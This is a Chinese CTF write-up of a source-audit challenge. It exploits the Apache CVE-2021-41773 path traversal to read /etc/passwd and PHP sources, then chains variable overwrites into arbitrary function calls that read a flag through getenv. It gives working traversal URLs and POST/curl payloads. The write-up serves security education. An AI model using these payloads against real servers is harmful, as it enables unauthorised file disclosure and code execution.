---
description: 这是一道源码审计类型的 CTF 题目。该题利用 Apache CVE-2021-41773 路径穿越读取 index.php 和 Class.php 源码，发现 Temp::display() 中 extract($this->date) 可被 POST 参数覆盖 $space=admin 进入 admin 模板分支并 include 模板，再借助模板中的 listdata("action=list module=$mod") 用 $mod 注入独立 token 覆盖 action=function，最终通过可控的 call_user_func_array('getenv', ['FLAG']) 读取环境变量中的 flag，核心是两级变量覆盖加任意函数调用。
---

## Background

- 题型：源码审计
- 信息收集：

```bash
dirsearch -u "http://node4.anna.nssnode.cn:29022"
```

![image-20261109141024023](image-20261109141024023.png)

发现 `/cgi-bin`，结合之前学的 CVE-2021-41773 Apache HTTP Server 2.4.49 路径穿越漏洞

尝试命令执行，有回显但很长看不懂，估计命令执行功能被某种规则 forbidden 了

只能以 `cgi-bin` 作为入口，进行任意文件读取

## Reproduction

### 1. 路径穿越读取源码

测试：

```
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

![1794185611811](1794185611811.png)

根据提示

`源码藏在上层目录xxx.php.txt里面`，读取 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/index.php.txt`：

```php
<h1>Welcome To GFCTF 12th!!</h1>
<?php
error_reporting(0);
define("main","main");
include "Class.php";
$temp = new Temp($_POST);
$temp->display($_GET['filename']);

?>
<!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?-->
```

根据提示，继续读取 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/Class.php.txt`：

```php
<?php
defined('main') or die("no!!"); 
Class Temp{
    private $date=['version'=>'1.0','img'=>'https://www.apache.org/img/asf-estd-1999-logo.jpg'];
    private $template;
    public function __construct($data){                       
        $this->date = array_merge($this->date,$data);
    }
    public function getTempName($template,$dir){
        if($dir === 'admin'){
            $this->template = str_replace('..','','./template/admin/'.$template);
            if(!is_file($this->template)){
                die("no!!");
            }
        }
        else{
            $this->template = './template/index.html';
        }
    }
    public function display($template,$space=''){
        extract($this->date);
        $this->getTempName($template,$space);
        include($this->template);
    }
    public function listdata($_params){
        $system = [
            'db' => '',
            'app' => '',
            'num' => '',
            'sum' => '',
            'form' => '',
            'page' => '',
            'site' => '',
            'flag' => '',
            'not_flag' => '',
            'show_flag' => '',
            'more' => '',
            'catid' => '',
            'field' => '',
            'order' => '',
            'space' => '',
            'table' => '',
            'table_site' => '',
            'total' => '',
            'join' => '',
            'on' => '',
            'action' => '',
            'return' => '',
            'sbpage' => '',
            'module' => '',
            'urlrule' => '',
            'pagesize' => '',
            'pagefile' => '',
        ];

        $param = $where = [];

        $_params = trim($_params);

        $params = explode(' ', $_params);
        if (in_array($params[0], ['list','function'])) {
            $params[0] = 'action='.$params[0];
        }
        foreach ($params as $t) {
            $var = substr($t, 0, strpos($t, '='));
            $val = substr($t, strpos($t, '=') + 1);
            if (!$var) {
                continue;
            }
            if (isset($system[$var])) { 
                $system[$var] = $val;
            } else {
                $param[$var] = $val; 
            }
        }
        // action
        switch ($system['action']) {

            case 'function':

                if (!isset($param['name'])) {
                    return  'hacker!!';
                } elseif (!function_exists($param['name'])) {
                    return 'hacker!!';
                }

                $force = $param['force'];
                if (!$force) {
                    $p = [];
                    foreach ($param as $var => $t) {
                        if (strpos($var, 'param') === 0) {
                            $n = intval(substr($var, 5));
                            $p[$n] = $t;
                        }
                    }
                    if ($p) {

                        $rt = call_user_func_array($param['name'], $p);
                    } else {
                        $rt = call_user_func($param['name']);
                    }
                    return $rt;
                }else{
                    return null;
                }
            case 'list':
                return json_encode($this->date);
        }
        return null;
    }
}
```

### 2. 第一级变量覆盖：进入 admin 模板分支

`index.php` 提供两个可交互点：`$_POST` 作为 `$data` 传进 `Temp::__construct`，`$_GET['filename']` 传给 `Temp::display`

`Temp::display` 里有个 `include($this->template)`，但 `$this->template` 由 `Temp::getTempName` 控制

且该函数内部有的两条 if 分支，都无法直接控制 `$this->template`

根据复杂度判断，要选 `/template/admin/` 这条分支：虽然有 `str_replace('..','',...)` 挡着 `../` 路径穿越，但相对另一条分支，这条分支最起码还有可控点

进入该分支，要求 `$dir === 'admin'`。`$dir` 就是 `display` 调用 `getTempName` 时传入的 `$space`，而 `$space` 默认是空

但 `display` 最前面有个 `extract`，它会把一个数组的各个键值对展开成变量（详见 [extract](#extract)）

那么 `$this->date` 是否可控、能否写入一个 `$space=admin`？

可行。`date` 是私有变量，`__construct` 初始化时通过 `array_merge` 把 `$date` 和 `$data` 合并后赋回 `date`（详见 [array_merge](#array_merge)），而这个 `$data` 正是 `new Temp($_POST)` 传进来的 POST 数组

所以只需 POST 提交 `space=admin`，经过 `__construct` 初始化，等进入 `getTempName` 时 `$space`，即 `$dir` 就是 `admin` 了

### 3. include admin 模板，进入 `listdata`

现在已进入 `$dir === 'admin'` 分支，并可通过 GET 传参 `filename` 控制 `$template`

虽然无法路径穿越，但 dirsearch 时发现过 `/template/admin/index.html`，其内容是：

```
listdata("action=list module=$mod");
```

能 `include /template/admin/index.html` 的去触发 `listdata`，随即主战场就转移到 `Temp::listdata` 了

### 4. 第二级变量覆盖：`action=function`

`listdata` 的代码很长，但主要分为 switch 之前的解析部分和 switch 之后的执行部分

传进来的 `$_params` 即 `action=list module=$mod`

`$mod` 是 `Temp::display` 进行 `/template/admin/index.html` 包含时传给 `Temp::listdata` 的变量

既然是在 `__construct` 初始化之后，那就可以和刚才处理 `$space` 一样

通过 POST 提交 `mod=xxx` 进行控制

我们接着看 `listdata` 这个函数，解析流程：

- `explode(' ', $_params)` 按空格切分（详见 [explode](#explode)）：

```php
$params = [
    0 => 'action=list',
    1 => 'module=$mod',
];
```

- if 判断要求 `$params` 的第一个变量是 `list` 或 `function`，而我们的是 `action=list`，不满足，也无影响，跳过
- foreach 用 `substr` + `strpos` 把每个 `key=value` 拆成键和值（详见 [substr + strpos](#substr_and_strpos)）：键在 `$system` 白名单里就写进 `$system`，否则写进 `$param`

经过这一轮解析：
- `$param` 为空
- `$system` 变成 `..., action => list, module => '$mod', ...`

进 switch 后命中 `case 'list'`，只返回 `json_encode($this->date)`，这是不可利用点

我们需要让 `action=function`，才能进入 `case 'function'` 走到 `call_user_func`

如何让 `action=function` 呐？

我们前面通过 `foreach substr&strpos` 给 `$system[action]` 赋值

如果让 `$mod` 中出现个 `action=function`，那么借助 `substr&strpos` 可以解析出 `$var=action, $val=function`，随后再通过 `foreach`，就能覆盖最开始的 `action=list`，达到我们的目的了

成，理论可行

POST 传参 `mod=xxx action=function`

经过 `__construct::array_merge`、`display::extract` 之后，到 `Temp::listdata` 时，就变成了 `listdata(action=list, module=xxx action=function)`

再经 foreach 解析，后面的 `action=function` 覆盖前面的 `action=list`

`$system` 就变成了 `..., action => function, module => 'xxx', ...`

成功拿到进入 `case 'function'` 的资格

> 为什么是 `mod=xxx action=function` 而不是 `mod=action=function`：
> 
> 如果是 `mod=action=function`，那么模板拼接：
> 
> ```php
> "action=list module=$mod" => "action=list module=action=function"
> ```
>
> `explode(' ')` 结果：
>
> ```php
> [
>   0 => 'action=list',
>   1 => 'module=action=function',
> ]
> ```
>
> 进 foreach 解析：
>
> ```php
> // token 0
> $var = 'action';  $val = 'list';    → $system['action'] = 'list'
> // token 1
> $var = 'module';  $val = 'action=function';  → $system['module'] = 'action=function'
> ```
>
> `action` 根本没有被覆盖
>
> 要覆盖 `action`，必须让注入的内容成为一个独立的 token，也就是引入空格进行隔断

### 5. 进入 case 'function'，调用 getenv 读 flag

逐关过条件：

- `!isset($param['name'])` 要求 `$param['name']` 存在且有值，否则被当成 `hacker!!` 扔出去。这里记一笔，一会 POST 传参时，在 `mod=xxx action=function` 后面补一个 `name=xxx` 占位
- `function_exists($param['name'])` 要求 `name` 还得是 PHP 的内置函数（版本差异很关键，详见 [function_exists](#function_exists)）。记一笔：一会补 `name` 时必须是 PHP 内置函数
- `$force = $param['force']`：`$param` 里本来没有 `force`，取出来是 `null`，`!null` 为真，直接过
- 参数组装：foreach 遍历 `$param`，把键名以 `param` 开头的项收进 `$p`，键为 `intval(substr($var, 5))`。`$p` 为空走 `call_user_func($param['name'])`，非空走 `call_user_func_array($param['name'], $p)`

先尝试 `space=admin&mod=xxx action=function name=getenv`，无参调用 `getenv`，回显除了一个 `Array` 外什么也没有：

![image-20261109180108262](image-20261109180108262.png)

那看来得试 `getenv("FLAG")`，也就是让 `call_user_func_array` 的 `$p` 带上 `FLAG`

最终 payload：

```http
POST /?filename=index.html HTTP/1.1

space=admin&mod=xxx action=function name=getenv param=FLAG
```

成功得到 flag：

![image-20261109134729161](image-20261109134729161.png)

再记一笔 `curl` 的操作姿势：

```bash
curl -s "http://node4.anna.nssctf.cn:20884/?filename=index.html" -d "space=admin&mod=0%20action=function%20name=getenv%20param=FLAG"
```

![image-20261109094520901](image-20261109094520901.png)

## Analysis

审计的核心问题：

- 外部传入的数据可以控制对象内部的哪些属性值？
- 这些数据后续又被传给了哪些危险函数？

这就是代码审计时需要追踪的数据流

本题数据流：

```text
创建 Temp 对象
    |
    v
初始化默认数据
    |
    v
调用 display()
    |
    +---- extract() 提取数据
    |
    +---- getTempName() 选择模板
    |
    +---- include() 加载模板

另一个入口：
    |
    v
调用 listdata($_params)
    |
    v
解析参数字符串
    |
    v
判断 action
    |
    +---- function：调用 PHP 函数
    |
    +---- list：返回 JSON 数据
```

## Further Reading

本题涉及的 PHP 函数详解

### 链式赋值

- `$param = $where = [];` 是，等价于：

```php
$where = [];
$param = $where;   // 也就是 $param = []
```

### defined

检查常量是否定义

Demo：

```php
<?php
define('main', true);

defined('main') or die("no!!");

echo "程序正常运行";
```

输出：

```text
程序正常运行
```

如果删除 `define('main', true);`，输出：

```text
no!!
```

这里的目的通常是防止用户直接访问某个 PHP 文件。注意：它只是简单的访问入口限制，并不是完整的安全验证

### array_merge

合并数组

```php
// 索引数组 —— 直接追加、重新编号
$a = ['a', 'b'];
$b = ['c', 'd'];

var_dump(array_merge($a, $b));
// [0=>'a', 1=>'b', 2=>'c', 3=>'d']


// 字索引键（数字键）会被重新从 0 编号，不是简单拼接原键
$a = [5 => 'x'];
$b = [10 => 'y'];
var_dump(array_merge($a, $b));
// [0=>'x', 1=>'y']   ⚠️ 原来的键 5、10 没了，重新编号


// 字符串键（关联数组）—— 后者覆盖前者
$a = ['name' => 'zigyr', 'img' => 'default.jpg'];
$b = ['img' => 'new.jpg', 'version' => '2.0'];

var_dump(array_merge($a, $b));
/*
[
  'name'    => 'zigyr',
  'img'     => 'new.jpg',   ← $b 覆盖了 $a 的 img
  'version' => '2.0',
]
*/


// 混合键 —— 数字重新编号，字符串覆盖
$a = [1 => 'a', 'k' => 'v1'];
$b = [2 => 'b', 'k' => 'v2'];

var_dump(array_merge($a, $b));
/*
[
  0   => 'a',     数字键重编号
  1   => 'b',
  'k' => 'v2',   字符串键覆盖
]
*/


// 多数组 + 空数组
var_dump(array_merge([1,2], [], [3,4]));
// [1,2,3,4]  ✅ 空数组无影响

var_dump(array_merge());
// []         ✅ PHP 7.4+ 无参返回空数组


// 和 + 运算符的区别
$a = [1 => 'a', 2 => 'b'];
$b = [1 => 'x', 3 => 'c'];

var_dump($a + $b);
// [1=>'a', 2=>'b', 3=>'c']          ← 数字键保留！重复键前者胜

var_dump(array_merge($a, $b));
// [0=>'a', 1=>'b', 2=>'x', 3=>'c']  ← 数字键重编号，全部保留
```

注意事项：

1. **数字键会被重编号**，无法保留原始索引。要保留键用 `+` 或 `array_replace`

2. **字符串键后者覆盖前者**（同名时），不是报错

3. **参数必须全是数组**。传非数组（`null`、字符串、对象）：PHP 8+ 抛 `TypeError`，PHP 7 发 `Warning` 并返回 `null`

4. **不递归**：嵌套数组只合最外层，内层整个被覆盖：

   ```php
   array_merge(['a'=>['x'=>1]], ['a'=>['y'=>2]]);
   // ['a'=>['y'=>2]]  ⚠️ 内层 x 丢了
   ```

   要递归合并用 `array_merge_recursive`（但同名标量会变成数组，常不符合预期），或用 `array_replace_recursive`。

5. **性能**：一次传多个数组比多次调用高效；大数据量注意内存（返回新数组）

6. **不改变原数组**，返回新数组

7. 别和 `array_combine`（键值配对）混淆——名字像但功能完全不同

### explode

按分隔符把字符串切成数组。

```php
$t = "name=zigyr";
$arr = explode('=', $t);
// ['name', 'zigyr']

// 限制最多切成 2 段（值里还有 = 时很有用）
$t2 = "url=http://a.com/?x=1&y=2";
var_dump(explode('=', $t2, 2));
// ['url', 'http://a.com/?x=1&y=2']  ✅ 只在第一个 = 处切
```

注意事项：

- 分隔符**不能是空字符串** `''`：PHP 8 抛 `ValueError`，PHP 7 返回 `false`
- **不限制段数**时，值里含分隔符会被切碎，所以解析 `key=value` 建议用 `explode('=', $t, 2)`
- 分隔符不在字符串里 → 返回**只有一个元素的数组** `[$t]`，不会返回 `false`
- 反向操作：`implode('=', $arr)`。

### substr_and_strpos

手动截取 `key=value` 的典型写法：

```php
$t = "version=2.0";

$var = substr($t, 0, strpos($t, '='));       // 从 0 截到 '=' 前 → "version"
$val = substr($t, strpos($t, '=') + 1);      // 从 '=' 后一位截到末尾 → "2.0"
```

拆开看：

- `strpos($t, '=')` 返回 `=` 的位置，这里是 **7**
- `substr($t, 0, 7)` → 取索引 0~6 → `"version"`
- `substr($t, 7 + 1)` → 从索引 8 截到结尾 → `"2.0"`

注意事项（这段代码的隐藏 bug）：

- 如果 `$t` 中**没有 `=`**：`strpos` 返回 `false`，`false + 1` 在 PHP 里当 `0 + 1 = 1`，`substr($t, 1)` 会截出错误结果，不报错但逻辑全错。必须先判断：

  ```php
  if (($pos = strpos($t, '=')) === false) {
      // 格式不对，跳过
  }
  ```

- `strpos` 返回值可能是 `0`（`=` 在开头，如 `"=abc"`），用 `=== false` 判断，别用 `!$pos`

- 值里含多个 `=` 时，`substr(..., $pos + 1)` 能正确保留后面的 `=`（比不限制的 `explode` 更稳）

- 中文字符串用 `mb_substr` + `mb_strpos`

> 其实 `explode('=', $t, 2)` 更简洁安全，这个手动写法是历史/老代码常见风格

### extract

把数组的键变成变量名，即把关联数组展开成当前作用域的变量

```php
$data = ['name' => 'zigyr', 'img' => 'default.jpg', 'version' => '2.0'];

extract($data);

echo $name;     // zigyr
echo $img;      // default.jpg
echo $version;  // 2.0
```

返回值是**成功创建的变量个数**（这里是 `3`）

注意事项（这是安全重灾区）：

- **默认是 `EXTR_OVERWRITE`**：如果已有同名变量会被**覆盖**。比如前面有 `$version`、`$var`，`extract` 后可能被改掉，导致逻辑被劫持

- **绝不能 `extract($_GET)` / `extract($_POST)`**：攻击者传 `?name=xxx&var=yyy` 就能覆盖你的变量，是经典漏洞（变量覆盖 → 逻辑绕过 / RCE）

- 可以用第二个参数控制策略：

  ```php
  extract($data, EXTR_SKIP);        // 已存在则不覆盖
  extract($data, EXTR_PREFIX_ALL, 'p'); // 加前缀：$p_name, $p_img
  ```

- 键名非法（如含 `-`、数字开头）会**跳过**不创建

- 只作用于**当前作用域**，在函数里 `extract` 出来的是局部变量

### function_exists

判断某函数是否已定义，检查一个**函数名字符串**是否已定义（内置或用户定义）

```php
var_dump(function_exists('strpos'));      // true  内置
var_dump(function_exists('my_func'));     // false 未定义
var_dump(function_exists('strpos(x)'));   // false ❌ 只认函数名，不认调用表达式
```

注意事项：

- 参数**必须是函数名字符串**，不能是调用表达式
- 只管**全局函数**，不管类方法。判断类方法用 `method_exists($obj, 'm')` 或 `is_callable`
- `function_exists('scandir(getcwd())')` 这种写法无法通过检查，它会返回 `false`

> `function_exists()` 返回 false 是 PHP 8.0+ 的行为，这是关键版本差异：
>
> - **PHP < 8.0**：`disable_functions` 只是禁止"调用"，函数仍注册在函数表里，`function_exists('system')` 返回 **true**。调用时会报 warning 并返回 `null`
> - **PHP >= 8.0**：被禁用的函数会从函数表中移除，`function_exists('system')` 返回 **false**

### call_user_func / call_user_func_array

`call_user_func` 用**逐个参数**的方式调用函数/方法/闭包：

```php
function add($a, $b) { return $a + $b; }

// 普通函数
echo call_user_func('add', 1, 2);   // 3

// 闭包
$f = fn($x) => $x * 2;
echo call_user_func($f, 5);         // 10

// 类静态方法（数组形式）
echo call_user_func(['MyClass', 'method'], $arg);

// 对象方法
echo call_user_func([$obj, 'method'], $arg);
```

注意事项：

- 第一个参数必须是**可调用体**（函数名 / 闭包 / `[类名或对象, 方法]`），否则返回 `false`（旧版）或抛 `TypeError`
- **传引用会失败**：`call_user_func('f', $var)` 里的 `$var` 不会按引用传给参数为 `&$x` 的函数，要用 `call_user_func_array` 且数组元素为引用
- 性能比直接调用略低（多一层间接）
- **安全**：如果第一个参数**用户可控**，等于任意函数调用 → 高危，必须白名单

`call_user_func_array` 和 `call_user_func` 一样，但**参数打包成数组**传：

```php
function add($a, $b) { return $a + $b; }

$args = [1, 2];
echo call_user_func_array('add', $args);   // 3

// 参数个数不定时特别方便
function sum(...$n) { return array_sum($n); }
echo call_user_func_array('sum', [1,2,3,4]); // 10

// 配合类方法
class C { public function m($x, $y){ return $x.$y; } }
echo call_user_func_array([new C, 'm'], ['a','b']); // ab
```

注意事项：

- 第二个参数**必须是数组**（PHP 8 要求，否则 `TypeError`）
- 数组的键名：PHP 8 起如果键名是字符串，会被当作**命名参数**处理，可能报错。用**索引数组**最稳
- 同样**不支持按引用传参**（除非数组元素本身是引用）
- **安全同上**：`call_user_func_array($fn, $args)` 如果 `$fn`、`$args` 都可控，就是标准 RCE 套路（一句话木马常用）